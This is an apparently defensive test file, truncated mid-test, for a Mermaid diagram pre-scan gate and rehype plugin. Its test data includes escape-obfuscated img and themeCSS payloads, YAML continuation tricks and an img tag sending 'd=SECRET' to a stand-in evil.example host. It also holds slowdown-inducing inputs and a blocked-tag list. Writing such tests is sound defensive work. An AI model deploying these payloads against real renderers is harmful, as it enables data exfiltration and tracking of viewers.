/**
 * 第 8 轮 review 返工：mermaid 预扫闸（R8-1 / R8-2 / R8-5）与 rehype 层两条小项（R8-7）。
 *
 * - R8-1：`@{}` / frontmatter 走 YAML、`%%{init}%%` 走 JSON，字符串转义（`"\u0069mg"`）会被解析器还原；预扫要先解转义。
 *   另外把 `themeCSS` 加进 mermaid 的 `secure` 键——用**真实 mermaid**（从 @streamdown/mermaid 的依赖里加载）验证引擎确实丢掉指令里的 themeCSS。
 * - R8-2：标签正则线性化（`"<" + 空白×1e5` 不再二次方）+ 200 KB 长度上限（超了按 too-long 命中，提示说清「源码过长」）。
 * - R8-5：误拦收窄（`url (x)` / `expression(`、光秃秃的 `<Link>` 泛型放行；完整 URL 仍拦——保守取舍）+ 提示文案说明「只是没渲染成图」。
 * - R8-7：rehype 层提示 `<p>` 带 `data-pane-search-ignore`（经 sanitize / harden 后仍在）；`pre` 里有多个 code 时不再只看第一个。
 * - R9-1（第 9 轮）：YAML 双引号串的「反斜杠 + 换行」续行也要解码（js-yaml 会把 `u\<换行>    rl(` 拼回 `url(`）。
 */
import { readFileSync, realpathSync } from "node:fs";
import path from "node:path";
import { pathToFileURL } from "node:url";
import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { Streamdown, defaultRemarkPlugins } from "streamdown";
import { describe, expect, it } from "vitest";

import { MarkdownText } from "@/components/markdown-text";
import { ImagePreviewProvider } from "@/components/ui/image-preview";
import { DOM_SEARCH_IGNORE_SELECTOR } from "@/lib/dom-text-search";
import { rehypeGateMermaidBlocks } from "@/lib/mermaid-rehype-gate";
import {
  MERMAID_DEFAULT_SECURE_KEYS,
  MERMAID_SAFE_CONFIG,
  MERMAID_SCAN_MAX_LENGTH,
  MERMAID_SECURE_KEYS,
  describeMermaidGateReasons,
  mermaidBlockedNotice,
  scanMermaidSource,
  type MermaidGateReason,
} from "@/lib/mermaid-source-gate";
import { REVISION_REHYPE_PLUGINS } from "@/lib/revision-rehype-plugins";
import { STREAMDOWN_REHYPE_PLUGINS } from "@/lib/streamdown-options";

const ROOT = path.resolve(import.meta.dirname, "..");
const blocked = (src: string): boolean => scanMermaidSource(src).blocked;
const reasonsOf = (src: string): MermaidGateReason[] => {
  const r = scanMermaidSource(src);
  return r.blocked ? r.reasons : [];
};

// ───────── R8-1：JSON / YAML / JS 字符串转义 ─────────

describe("R8-1：预扫解 \\uXXXX / \\u{…} / \\xXX / \\UXXXXXXXX 转义", () => {
  // 审查方实测的两个放行样本（`blocked:false`）
  const REVIEWER_IMG = `flowchart LR\nA@{ "\\u0069mg": "\\u0068ttps://evil.example/p?d=1" }`;
  const REVIEWER_THEMECSS =
    `%%{init: {"theme\\u0043SS": ".node *{background-image:\\u0075rl(\\u0068ttps://evil.example/p)}"}}%%\nflowchart LR\nA-->B`;

  it("审查方样本 1：A@{ \"\\u0069mg\": \"\\u0068ttps://…\" } → 命中（img 形状 + 远程地址）", () => {
    const r = scanMermaidSource(REVIEWER_IMG);
    expect(r.blocked).toBe(true);
    expect(reasonsOf(REVIEWER_IMG)).toEqual(expect.arrayContaining(["img-shape", "remote-url"]));
  });

  it("审查方样本 2：%%{init: {\"theme\\u0043SS\": \"…\\u0075rl(\\u0068ttps://…)\"}}%% → 命中（themeCSS + css-url + 远程地址）", () => {
    const r = scanMermaidSource(REVIEWER_THEMECSS);
    expect(r.blocked).toBe(true);
    expect(reasonsOf(REVIEWER_THEMECSS)).toEqual(expect.arrayContaining(["theme-css", "css-url", "remote-url"]));
  });

  it("对照（原来就拦）：未转义的写法同样命中", () => {
    expect(blocked(`flowchart LR\nA@{ img: "https://evil.example/p" }`)).toBe(true);
    expect(blocked(`flowchart LR\nA["<img src='https://x/p'>"]`)).toBe(true);
  });

  const HIT: Array<[string, string]> = [
    ["\\uXXXX 小写 hex：\"\\u0069mg\"", `flowchart LR\nA@{ "\\u0069mg": "x" }`],
    ["\\uXXXX 大写 hex：themeCSS 的 C = \\u0043 / s = \\u0073", `%%{init: {"theme\\u0043\\u0053\\u0053": "x"}}%%\nflowchart LR\nA-->B`],
    ["\\uXXXX 大小写 hex 混写：\\u004D / \\u004d（M）", `flowchart LR\nA@{ "i\\u004D\\u0047": "x" }`],
    ["\\uXXXX 整个 key 都转义：\\u0069\\u006d\\u0067", `flowchart LR\nA@{ "\\u0069\\u006d\\u0067": "x" }`],
    ["\\xXX（YAML / JS）：\"\\x69mg\"", `flowchart LR\nA@{ "\\x69mg": "x" }`],
    ["\\xXX 大写 hex：themeCSS 的 C = \\x43", `%%{init: {"theme\\x43SS": "x"}}%%\nflowchart LR\nA-->B`],
    ["\\UXXXXXXXX（YAML 8 位）：\"\\U00000069mg\"", `flowchart LR\nA@{ "\\U00000069mg": "x" }`],
    ["\\u{…}（JS）：\"\\u{69}mg\"", `flowchart LR\nA@{ "\\u{69}mg": "x" }`],
    ["\\u{…} 带前导 0 与大写 hex：\\u{00000049}→ I", `flowchart LR\nA@{ "\\u{00000049}mg": "x" }`],
    ["http 协议的 h / t / s 用转义写：\\u0068ttps://", `flowchart LR\nA["\\u0068ttps://evil.example/p"]`],
    ["scheme 用 \\x 写：\\x68ttps://", `flowchart LR\nA["\\x68ttps://evil.example/p"]`],
    ["url( 用转义写：\\u0075rl(x)", `flowchart LR\nclassDef x background:\\u0075rl(x)`],
    ["< 用转义写：\\u003cimg src=x>", `flowchart LR\nA["\\u003cimg src=x>"]`],
    ["标签名用转义写：<\\u0069mg src=x>", `flowchart LR\nA["<\\u0069mg src=x>"]`],
    ["frontmatter（YAML 双引号）里的 themeCSS 转义", `---\nconfig:\n  "theme\\u0043SS": ".x{}"\n---\nflowchart LR\nA-->B`],
    // 多层：JSON 转义 → HTML 实体 → 字符 / 实体产生反斜杠 → 转义
    ["两层：\\u0026lt;img（JSON 转义的 & + 实体 lt）", `flowchart LR\nA["\\u0026lt;img src=x\\u0026gt;"]`],
    ["两层：&#92;u0069mg（实体写出反斜杠，再接 \\u 转义）", `flowchart LR\nA@{ "&#92;u0069mg": "x" }`],
    ["零宽字符夹在转义序列后面", `flowchart LR\nA@{ "\\u0069\u200bmg": "x" }`],
    // UTF-16 代理对 / 超 BMP 码点不打断后续转义的解码
    ["前面有代理对 \\ud83d\\ude00 的转义链", `flowchart LR\nA@{ "\\ud83d\\ude00\\u0069mg": "x" }`],
    ["前面有 \\u{1F600} 的转义链", `flowchart LR\nA@{ "\\u{1F600}\\u0069mg": "x" }`],
    ["前面有孤立代理的转义链", `flowchart LR\nA@{ "\\ud800\\u0069mg": "x" }`],
    ["前面有反序代理（先低后高）的转义链", `flowchart LR\nA@{ "\\ude00\\ud83d\\u0069mg": "x" }`],
    ["前面有 \\UXXXXXXXX 超 BMP 的转义链", `flowchart LR\nA@{ "\\U0001F600\\u0069mg": "x" }`],
    // JSON 里的 \t \n \r 在 URL 里会被浏览器丢掉（字面两字符序列也抹）
    ["URL 里夹字面 \\t（JSON 解析后是真 tab，浏览器会丢）", `flowchart LR\nA["ht\\ttps://x.example"]`],
    ["URL 里夹字面 \\n", `flowchart LR\nA["ht\\ntps://x.example"]`],
    ["URL 里夹字面 \\r", `flowchart LR\nA["ht\\rtps://x.example"]`],
  ];

  it.each(HIT)("%s → blocked", (_label, src) => {
    expect(blocked(src), src).toBe(true);
  });

  it("代理对合成为一个码点：<im😀g x> 里的 😀（\\ud83d\\ude00 / \\u{1F600} / \\U0001F600）不是 ASCII，浏览器也不会当 <img>——放行；孤立代理则被抹掉（保守地按 <img x> 拦）", () => {
    for (const esc of ["\\ud83d\\ude00", "\\uD83D\\uDE00", "\\u{1F600}", "\\U0001F600"]) {
      expect(blocked(`flowchart LR\nA["<im${esc}g x>"]`), esc).toBe(false);
    }
    // 对照：孤立代理（没有配对）无字符可言，抹成空串 → `<img x>` 命中
    expect(blocked(`flowchart LR\nA["<im\\ud83dg x>"]`)).toBe(true);
    expect(blocked(`flowchart LR\nA["<im\\ude00g x>"]`)).toBe(true);
  });

  it("转义解码后无害的内容不误拦：\\u0041、中文、emoji、普通 \\xNN", () => {
    expect(blocked(`flowchart LR\nA["\\u0041 \\u0042"]`)).toBe(false);
    expect(blocked(`flowchart LR\nA["\\u4e2d\\u6587"]`)).toBe(false);
    expect(blocked(`flowchart LR\nA@{ label: "\\u{1F600}" }`)).toBe(false);
    expect(blocked(`flowchart LR\nA["\\x41\\x42"]`)).toBe(false);
    expect(blocked(`flowchart LR\nA["\\U0001F600"]`)).toBe(false);
  });

  it("非法 / 畸形转义不崩（返回合法判定对象）", () => {
    const BAD = [
      "\\u12",
      "\\uZZZZ",
      "\\u",
      "\\u{",
      "\\u{}",
      "\\u{110000}",
      "\\u{ffffffffff}",
      `\\u{${"0".repeat(5000)}69}`,
      "\\u{G}",
      "\\x",
      "\\xZ1",
      "\\x6",
      "\\U1234",
      "\\U0011FFFF",
      "\\UFFFFFFFF",
      "\\ud83d",
      "\\ude00\\ud83d",
      "\\ud83d\\u0041",
      "\\",
      "\\\\u0069mg",
      "\\\\\\u0069mg",
    ];
    for (const bad of BAD) {
      let r: ReturnType<typeof scanMermaidSource> | undefined;
      expect(() => {
        r = scanMermaidSource(`flowchart LR\nA@{ label: "${bad}" }`);
      }, bad).not.toThrow();
      expect(typeof r!.blocked, bad).toBe("boolean");
    }
    // 超出 Unicode 范围的码点抹成空串（不是 NUL / 乱码字符）：夹在标签名里被抹掉后就是 <img x>
    expect(blocked(`flowchart LR\nA["<im\\u{110000}g x>"]`)).toBe(true);
    expect(blocked(`flowchart LR\nA["<im\\UFFFFFFFFg x>"]`)).toBe(true);
    // 不合法的写法本身不构成「转义」：`\u12` 后面不够 4 位，不被当成 u+0012
    expect(blocked(`flowchart LR\nA["\\u12 plain"]`)).toBe(false);
  });
});

// ───────── R9-1：YAML 双引号串的「反斜杠 + 换行」续行 ─────────

describe("R9-1：预扫解 YAML 双引号串的 `\\` + 换行续行转义", () => {
  // 审查方实测样本：js-yaml 解出 `x;background-image:url(https://evil.example/p)`，原先 scanMermaidSource 返回 blocked:false
  const YAML_URL = `---\nconfig:\n  fontFamily: "x;background-image:u\\\n    rl(ht\\\n    tps://evil.example/p)"\n---\nflowchart LR\nA-->B`;
  const YAML_THEMECSS = `---\nconfig:\n  "theme\\\n  CSS": "x"\n---\nflowchart LR\nA-->B`;

  it("审查方样本：fontFamily 里用续行拼出 url(https://…) → 命中（css-url + remote-url）", () => {
    expect(YAML_URL).toContain("u\\\n    rl(");
    expect(blocked(YAML_URL)).toBe(true);
    expect(reasonsOf(YAML_URL)).toEqual(expect.arrayContaining(["css-url", "remote-url"]));
  });

  it("审查方样本：键名 theme\\<换行>CSS → 命中 theme-css", () => {
    expect(blocked(YAML_THEMECSS)).toBe(true);
    expect(reasonsOf(YAML_THEMECSS)).toContain("theme-css");
  });

  it("CRLF / 纯 CR / 反斜杠后带尾随空白 / 下一行没有缩进 的变体同样命中", () => {
    for (const nl of ["\r\n", "\r", "\n"]) {
      for (const trail of ["", " ", "\t "]) {
        for (const indent of ["", "    ", "\t"]) {
          const src = `---\nconfig:\n  fontFamily: "x;background-image:u\\${trail}${nl}${indent}rl(ht\\${trail}${nl}${indent}tps://evil.example/p)"\n---\nflowchart LR\nA-->B`;
          expect(blocked(src), JSON.stringify({ nl, trail, indent })).toBe(true);
        }
      }
    }
  });

  it("续行拼出 `<img` 标签 / `img:` 形状同样命中（不只 url）", () => {
    expect(blocked(`flowchart LR\nA["<im\\\n   g src=x>"]`)).toBe(true);
    // `@{ "img": … }` 形状键：续行拼出来的判定必须与直接写 `"img"` 一致（都命中 img-shape）
    expect(blocked(`flowchart LR\nA@{ "img": "x" }`)).toBe(true);
    expect(reasonsOf(`flowchart LR\nA@{ "im\\\n  g": "x" }`)).toContain("img-shape");
  });

  it("对照：无害的续行（把一句话拆成两行）不误拦", () => {
    expect(blocked(`flowchart LR\nA["hello \\\n    world"]`)).toBe(false);
    expect(blocked(`---\nconfig:\n  fontFamily: "Arial, \\\n    sans-serif"\n---\nflowchart LR\nA-->B`)).toBe(false);
  });

  it("病态输入仍是线性：反斜杠 + 十几万空白（无换行）/ 大量「反斜杠 + 空白」/ 大量续行", () => {
    const cases: string[] = [
      "\\" + " ".repeat(190_000),
      "\\ ".repeat(60_000),
      "\\\t".repeat(60_000),
      "\\\n".repeat(95_000),
      "\\" + " ".repeat(95_000) + "\n" + " ".repeat(95_000),
    ];
    for (const body of cases) {
      const t0 = performance.now();
      const r = scanMermaidSource(`flowchart LR\nA["${body}"]`);
      const ms = performance.now() - t0;
      expect(typeof r.blocked).toBe("boolean");
      // 二次方的话这里是几十秒；线性是几十毫秒。预算给得很宽，只防回退
      expect(ms, `${body.slice(0, 8)}… 耗时 ${ms.toFixed(0)}ms`).toBeLessThan(3000);
    }
  });
});

// ───────── R8-1：themeCSS 进 mermaid 的 secure 键（真实 mermaid 验证） ─────────

type RealMermaid = {
  initialize: (cfg: Record<string, unknown>) => void;
  parse: (text: string, opts?: { suppressErrors?: boolean }) => Promise<unknown>;
  mermaidAPI: {
    getConfig: () => Record<string, unknown>;
    getSiteConfig: () => Record<string, unknown>;
    defaultConfig: { secure?: string[] };
  };
};

/** mermaid 是 @streamdown/mermaid 的依赖（pnpm 不会把它提到根 node_modules）：从该包的真实位置旁边找 */
const loadRealMermaid = async (): Promise<RealMermaid> => {
  const pluginDir = realpathSync(path.join(ROOT, "node_modules/@streamdown/mermaid"));
  const mermaidDir = path.resolve(pluginDir, "../../mermaid");
  const entry = path.join(mermaidDir, "dist/mermaid.core.mjs");
  const mod = (await import(/* @vite-ignore */ pathToFileURL(entry).href)) as { default: RealMermaid };
  return mod.default;
};

describe("R8-1：MERMAID_SAFE_CONFIG.secure 含 themeCSS 与全部默认键（真实 mermaid 行为）", () => {
  const THEME_CSS_INIT = `%%{init: {"themeCSS": ".node *{background-image:url(https://evil.example/p)}"}}%%\nflowchart LR\nA-->B`;
  const THEME_CSS_ESCAPED =
    `%%{init: {"theme\\u0043SS": ".node *{background-image:\\u0075rl(\\u0068ttps://evil.example/p)}"}}%%\nflowchart LR\nA-->B`;
  const THEME_CSS_FRONTMATTER = `---\nconfig:\n  themeCSS: ".node *{background-image:url(https://evil.example/p)}"\n---\nflowchart LR\nA-->B`;
  const SECURITY_LEVEL_INIT = `%%{init: {"securityLevel": "loose"}}%%\nflowchart LR\nA-->B`;

  it("配置本身：secure 含 themeCSS，且包含我们记下的全部默认键；securityLevel 仍钉 strict", () => {
    const secure = MERMAID_SAFE_CONFIG.secure as string[];
    expect(secure).toContain("themeCSS");
    for (const k of MERMAID_DEFAULT_SECURE_KEYS) expect(secure, k).toContain(k);
    expect([...MERMAID_SECURE_KEYS].sort()).toEqual([...secure].sort());
    expect(MERMAID_SAFE_CONFIG.securityLevel).toBe("strict");
  });

  it("我们记的默认键 ⊇ 真实 mermaid 的 defaultConfig.secure（mermaid 升级加了新默认键而这里漏了会变红）", async () => {
    const real = await loadRealMermaid();
    const upstream = real.mermaidAPI.defaultConfig.secure;
    expect(Array.isArray(upstream)).toBe(true);
    for (const k of upstream!) expect(MERMAID_DEFAULT_SECURE_KEYS as readonly string[], k).toContain(k);
    // 反向：themeCSS 确实不在上游默认里（这正是要加它的原因）
    expect(upstream).not.toContain("themeCSS");
  });

  it("真实 mermaid：不配 secure → 指令里的 themeCSS 进了生效配置（含转义写法被 JSON 解析还原）；配了 → 被引擎丢掉", async () => {
    const real = await loadRealMermaid();
    const base = { startOnLoad: false, securityLevel: "strict" };

    // 对照组：没有 secure（上游默认）→ 三种写法的 themeCSS 都生效（证明下面的断言有区分度）
    real.initialize({ ...base });
    for (const src of [THEME_CSS_INIT, THEME_CSS_ESCAPED, THEME_CSS_FRONTMATTER]) {
      await real.parse(src, { suppressErrors: true });
      expect(String(real.mermaidAPI.getConfig().themeCSS), src).toContain("url(https://evil.example/p)");
    }

    // 实验组：用我们的配置（只取 securityLevel / secure，dompurifyConfig 与本断言无关）
    real.initialize({ ...base, secure: MERMAID_SAFE_CONFIG.secure });
    for (const src of [THEME_CSS_INIT, THEME_CSS_ESCAPED, THEME_CSS_FRONTMATTER]) {
      await real.parse(src, { suppressErrors: true });
      expect(real.mermaidAPI.getConfig().themeCSS, src).toBeUndefined();
    }
  });

  it("真实 mermaid：加了 themeCSS 之后默认键没被冲掉——securityLevel 指令仍然改不了（合并而非覆盖）", async () => {
    const real = await loadRealMermaid();
    real.initialize({ startOnLoad: false, securityLevel: "strict", secure: MERMAID_SAFE_CONFIG.secure });
    const site = real.mermaidAPI.getSiteConfig().secure as string[];
    for (const k of MERMAID_DEFAULT_SECURE_KEYS) expect(site, k).toContain(k);
    expect(site).toContain("themeCSS");
    await real.parse(SECURITY_LEVEL_INIT, { suppressErrors: true });
    expect(real.mermaidAPI.getConfig().securityLevel).toBe("strict");
    // 其它正常指令不受影响（只丢 secure 键）
    await real.parse(`%%{init: {"theme": "dark"}}%%\nflowchart LR\nA-->B`, { suppressErrors: true });
    expect(real.mermaidAPI.getConfig().theme).toBe("dark");
  });
});

// ───────── R8-2：线性扫描 + 长度上限 ─────────

describe("R8-2：预扫耗时上限（线性，没有二次方回溯）", () => {
  const N = 100_000;
  // 宽松上限（线性实现 1e5 量级是个位数~几十毫秒；二次方实现 N=1e5 要 30 秒以上）——抖动再大也不会碰到
  const BUDGET_MS = 1500;

  const SAMPLES: Array<[string, string]> = [
    ["`<` + 空白×1e5 + x（审查方实测：二次方）", `<${" ".repeat(N)}x`],
    ["`<` + 空白×1e5（无后续）", `<${" ".repeat(N)}`],
    ["`</` + 空白×1e5 + x", `</${" ".repeat(N)}x`],
    ["`<` + 斜杠×1e5 + x", `<${"/".repeat(N)}x`],
    ["`<` + ` /`×5e4 + x", `<${" /".repeat(N / 2)}x`],
    ["`<` + 换行×1e5 + x", `<${"\n".repeat(N)}x`],
    ["`<` + 空白×1e5 + 危险标签名但被截断 imgx", `<${" ".repeat(N)}imgx`],
    ["`<` + 空白×1e5 + 属性标签 table + 空白", `<${" ".repeat(N)}table `],
    ["`< ` × 5e4（每个 < 后只有一个空白）", "< ".repeat(N / 2)],
    ["`<`×1e5", "<".repeat(N)],
    ["`<` + 空白×1e5 + `<` + 空白×1e5（两段）", `<${" ".repeat(N / 2)}<${" ".repeat(N / 2)}x`],
    ["`url` + 空白×1e5", `url${" ".repeat(N)}`],
    ["`image-set` + 空白×1e5", `image-set${" ".repeat(N)}`],
    ["`@` + 空白×1e5 + x", `@${" ".repeat(N)}x`],
    [" `src` + 空白×1e5", ` src${" ".repeat(N)}`],
    ["`<a ` + ` src`×3e4 + 空白", `<a${" src".repeat(30_000)}${" ".repeat(N / 2)}`],
    ["`img` + 空白×1e5 + 无冒号", `img${" ".repeat(N)}x`],
    ['`"img"` 引号堆叠', `${'"img'.repeat(25_000)}`],
    ["`//` + a×1e5（协议相对的 host 段）", `//${"a".repeat(N)}`],
    ["`//a`×3e4", "//a".repeat(30_000)],
    ["`a.`×5e4 + `//`", `//${"a.".repeat(N / 2)}`],
    ["`&#x` + 0×1e5", `&#x${"0".repeat(N)}`],
    ["`&`×1e5", "&".repeat(N)],
    ["`&a`×5e4", "&a".repeat(N / 2)],
    ["`#`×1e5", "#".repeat(N)],
    ["`#1`×5e4", "#1".repeat(N / 2)],
    ["`\\`×1e5", "\\".repeat(N)],
    ["`\\u{` + 0×1e5（无闭合）", `\\u{${"0".repeat(N)}`],
    ["`\\u`×5e4", "\\u".repeat(N / 2)],
    ["`\\ud83d`×2e4", "\\ud83d".repeat(20_000)],
    ["`\\ud83d\\ude00`×1e4", "\\ud83d\\ude00".repeat(10_000)],
    ["`\\x`×5e4", "\\x".repeat(N / 2)],
    ["`\\U`×5e4", "\\U".repeat(N / 2)],
    ["纯空白×1e5", " ".repeat(N)],
    ["纯 a×1e5", "a".repeat(N)],
    ["`<img ` + 未闭合引号属性", `<img ${'x="'.repeat(25_000)}`],
    ["`A-->B\\n`×2e4", "A-->B\n".repeat(20_000)],
  ];

  it.each(SAMPLES)("%s：< 1.5 s", (_label, src) => {
    expect(src.length).toBeLessThanOrEqual(MERMAID_SCAN_MAX_LENGTH); // 样本必须真的走扫描（不是被长度上限短路）
    const t0 = performance.now();
    scanMermaidSource(src);
    const ms = performance.now() - t0;
    expect(ms, `${_label}: ${ms.toFixed(0)} ms`).toBeLessThan(BUDGET_MS);
  });

  it("审查方量级：`<` + 空白×(2 万 / 4 万 / 8 万) 的耗时增长不超线性太多（二次方会是 4 倍 / 16 倍）", () => {
    const time = (n: number): number => {
      const t0 = performance.now();
      scanMermaidSource(`<${" ".repeat(n)}x`);
      return performance.now() - t0;
    };
    time(1000); // 预热
    const t1 = Math.max(time(20_000), 0.5);
    const t4 = time(80_000);
    // 线性：t4 ≈ 4·t1（给 20× 的余量吸收抖动）；二次方：t4 ≈ 16·t1 且绝对值就是 20 秒量级
    expect(t4).toBeLessThan(BUDGET_MS);
    expect(t4 / t1).toBeLessThan(80);
  });
});

describe("R8-2：长度上限（超过按 too-long 命中，提示说清「源码过长」）", () => {
  it("上限 = 200 KB（20 万字符）；刚好等于上限仍扫描、多一个字符就 too-long", () => {
    expect(MERMAID_SCAN_MAX_LENGTH).toBe(200_000);
    const ok = "a".repeat(MERMAID_SCAN_MAX_LENGTH);
    expect(scanMermaidSource(ok)).toEqual({ blocked: false });
    expect(scanMermaidSource(`${ok}a`)).toEqual({ blocked: true, reasons: ["too-long"] });
  });

  it("超长输入不扫描内容：即使全是无害文字也直接命中；危险内容也只报 too-long（短路，不付扫描耗时）", () => {
    const long = "A-->B\n".repeat(40_000); // 24 万字符
    expect(scanMermaidSource(long)).toEqual({ blocked: true, reasons: ["too-long"] });
    const t0 = performance.now();
    scanMermaidSource(`<img src=x>${"<".repeat(MERMAID_SCAN_MAX_LENGTH)}`);
    expect(performance.now() - t0).toBeLessThan(50);
    expect(reasonsOf(`<img src=x>${" ".repeat(MERMAID_SCAN_MAX_LENGTH)}`)).toEqual(["too-long"]);
  });

  it("提示文案：说「源码过长」、写出上限、说明没做预扫 / 只显示源码 / 源码可看可复制；原因清单可读", () => {
    const text = mermaidBlockedNotice(["too-long"]);
    expect(text).toContain("源码过长");
    expect(text).toContain("200 KB");
    expect(text).toContain("只显示源码");
    expect(text).toContain("可查看");
    expect(text).toContain("可复制");
    expect(text).not.toContain("外部资源引用"); // 不能冤枉成「含外部资源」
    expect(describeMermaidGateReasons(["too-long"])).toBe("源码过长");
  });

  it("非文本输入有自己的措辞（不再套「含外部资源引用」）", () => {
    const text = mermaidBlockedNotice(["invalid-input"]);
    expect(text).toContain("不是文本");
    expect(text).toContain("只显示源码");
    expect(text).not.toContain("外部资源引用");
  });
});

// ───────── R8-5：误拦收窄 ─────────

describe("R8-5：误拦收窄（放行集 / 仍拦集 / 取舍）", () => {
  const PASS: Array<[string, string]> = [
    ["Base URL (prod)（`url (` 带空格不是 CSS 函数）", `flowchart LR\n  A["Base URL (prod)"]`],
    ["Regular expression (regex)（expression 已无引擎支持）", `flowchart LR\n  A["Regular expression (regex)"]`],
    ["expression(…) 本身也不再算（IE 专有，现代浏览器 / mermaid 都不支持）", `flowchart LR\n  classDef x width:expression(1)`],
    ["类图泛型 +List<Link> items", `classDiagram\n  class Foo {\n    +List<Link> items\n  }`],
    ["节点文字里的 Array<Image>", `flowchart LR\n  A["Array<Image>"]`],
    ["<Link>", `flowchart LR\n  A["<Link>"]`],
    ["</Link>", `flowchart LR\n  A["</Link>"]`],
    ["<Link/>", `flowchart LR\n  A["<Link/>"]`],
    ["<Source> / <Track> / <Video> / <Audio>", `flowchart LR\n  A["List<Source> List<Track> List<Video> List<Audio>"]`],
    ["<Frame> / <Embed> / <Meta> / <Base> / <Iframe>", `flowchart LR\n  A["Set<Frame> Set<Embed> Set<Meta> Set<Base> Set<Iframe>"]`],
    ["<Picture> / <Img>", `flowchart LR\n  A["List<Picture> List<Img>"]`],
    ["实体写的 &lt;Link&gt;（DOM 里就是文字 <Link>）", `flowchart LR\n  A["List&lt;Link&gt;"]`],
    ["光秃秃的 <picture>", `flowchart LR\nA["<picture>"]`],
    ["光秃秃的 </img>", `flowchart LR\nA["</img>"]`],
    ["零宽字符夹在光秃秃标签名里（抹掉后是 <img>）", `flowchart LR\nA["<im\u200bg>"]`],
    ["url 作词 + 括号（带空格）：see url (docs)", `flowchart LR\n  A["see url (docs)"]`],
    ["curl(x)（前面是标识符字符）", `flowchart LR\n  A["curl(x)"]`],
  ];

  it.each(PASS)("放行：%s", (_label, src) => {
    expect(scanMermaidSource(src), src).toEqual({ blocked: false });
  });

  const STILL_BLOCKED: Array<[string, string]> = [
    // 完整 URL：有意保守，不放宽（用户拍板）
    ["节点标签里的普通文字 see https://example.com/docs", `flowchart LR\n  A["see https://example.com/docs"]`],
    ["http:// 单独出现", `flowchart LR\n  A["http://localhost:3000"]`],
    // CSS：紧贴括号的 url( 仍拦
    ["Base URL(prod)（紧贴括号）", `flowchart LR\n  A["Base URL(prod)"]`],
    ["classDef url(x)", `flowchart LR\nclassDef x background:url(x)`],
    ["classDef URL(x)", `flowchart LR\nclassDef x background:URL(x)`],
    ["image-set (…)（没动：保守）", `flowchart LR\nclassDef x background:image-set ("x" 1x)`],
    // 标签：名字后面还有别的东西
    ["<Link rel=stylesheet href=x>", `flowchart LR\n  A["<Link rel=stylesheet href=x>"]`],
    ["<Link, X>（逗号：泛型多参数，保守仍拦）", `flowchart LR\n  A["Map<Link, X>"]`],
    ["Map<Image, String>", `flowchart LR\n  A["Map<Image, String>"]`],
    ["<link（流式半截，后面还没闭合）", `flowchart LR\n  A["<link`],
    ["<link 后面是空白（可能马上写属性）", `flowchart LR\n  A["<link `],
    ["<img/src=x>", `flowchart LR\n  A["<img/src=x>"]`],
    ["<img\\n>（换行后才闭合：保守拦）", `flowchart LR\n  A["<img\n>"]`],
    ["< img >（空白后闭合：保守拦）", `flowchart LR\n  A["< img >"]`],
    ["<img//>", `flowchart LR\n  A["<img//>"]`],
    ["原文 <Link&gt;（实体闭合）：原文变体里 <link 后面是 &", `flowchart LR\n  A["<Link&gt; x"]`],
    // 光秃秃也拦的那批（自带执行 / 内联内容 / 子资源能力）
    ["<script>", `flowchart LR\n  A["<script>"]`],
    ["<style>", `flowchart LR\n  A["<style>"]`],
    ["<svg>", `flowchart LR\n  A["<svg>"]`],
    ["</svg>", `flowchart LR\n  A["</svg>"]`],
    ["<math>", `flowchart LR\n  A["<math>"]`],
    ["<use>", `flowchart LR\n  A["<use>"]`],
    ["<foreignObject>", `flowchart LR\n  A["<foreignObject>"]`],
    // 放行一个泛型不等于放行整图：别处出现资源引用照拦
    ["<Link> 与 src= 同图", `flowchart LR\n  A["List<Link>"] --> B["<span src=x>"]`],
    ["<Link> 与 url( 同图", `flowchart LR\n  A["List<Link>"]\n  classDef x background:url(x)`],
    ["<Link> 与 https:// 同图", `flowchart LR\n  A["List<Link>"] --> B["https://x.example"]`],
    ["<Link> 与 themeCSS 同图", `%%{init: {"themeCSS": "x"}}%%\nflowchart LR\n  A["List<Link>"]`],
  ];

  it.each(STILL_BLOCKED)("仍拦：%s", (_label, src) => {
    expect(blocked(src), src).toBe(true);
  });

  it("提示文案：说明预扫是保守的、只是没渲染成图、源码完整可看可复制（并且仍含「只显示源码」）", () => {
    const text = mermaidBlockedNotice(["remote-url"]);
    expect(text).toContain("只显示源码");
    expect(text).toContain("保守");
    expect(text).toContain("只是没渲染成图");
    expect(text).toContain("源码完整");
    expect(text).toContain("可查看");
    expect(text).toContain("可复制");
    expect(text).toContain("http(s) 地址");
  });
});

// ───────── R8-7：rehype 层提示 <p> 与 pre 里多个 code ─────────

type Hast = { type: string; tagName?: string; value?: string; properties?: Record<string, unknown>; children?: Hast[] };

const codeEl = (lang: string, text: string): Hast => ({
  type: "element",
  tagName: "code",
  properties: { className: [`language-${lang}`] },
  children: [{ type: "text", value: text }],
});
const preOf = (...children: Hast[]): Hast => ({ type: "element", tagName: "pre", properties: {}, children });
const runRehype = (children: Hast[]): Hast => {
  const tree: Hast = { type: "root", children };
  (rehypeGateMermaidBlocks as unknown as () => (t: unknown) => void)()(tree);
  return tree;
};
const DANGEROUS = `flowchart LR\nA["<img src='https://x/p'>"]`;
const SAFE = "graph TD\nA-->B";
const classesOf = (code: Hast): string[] => code.properties?.className as string[];

describe("R8-7：命中提示 <p> 带 dataPaneSearchIgnore（栏内搜索不计这行文字）", () => {
  it("AST：提示 <p> 同时带 dataMermaidGated 与 dataPaneSearchIgnore", () => {
    const tree = runRehype([preOf(codeEl("mermaid", DANGEROUS))]);
    const notice = tree.children![0]!;
    expect(notice.tagName).toBe("p");
    expect(notice.properties?.dataMermaidGated).toBe("true");
    expect(notice.properties?.dataPaneSearchIgnore).toBe("true");
  });

  it("DOM 搜索的忽略选择器认 [data-pane-search-ignore]（hast 属性 dataPaneSearchIgnore 渲染出来的正是它）", () => {
    expect(DOM_SEARCH_IGNORE_SELECTOR.split(",")).toContain("[data-pane-search-ignore]");
  });

  const MALICIOUS_MD = ["前言", "", "```mermaid", "flowchart LR", `A["<img src='https://evil.example/p?d=SECRET'>"]`, "```"].join("\n");

  const noticeTag = (html: string): string => {
    const m = html.match(/<p\b[^>]*data-mermaid-gated="true"[^>]*>/);
    expect(m, html).not.toBeNull();
    return m![0];
  };

  it("真实 MarkdownText SSR（sanitize → mermaid 闸 → harden 全链）：提示 <p> 上有 data-pane-search-ignore=\"true\"", () => {
    const html = renderToStaticMarkup(
      createElement(ImagePreviewProvider, null, createElement(MarkdownText, { text: MALICIOUS_MD })),
    );
    expect(noticeTag(html)).toContain('data-pane-search-ignore="true"');
    expect(html).toContain("只显示源码"); // 提示文字本身还在（只是搜索不计）
  });

  it("流式实例同样带", () => {
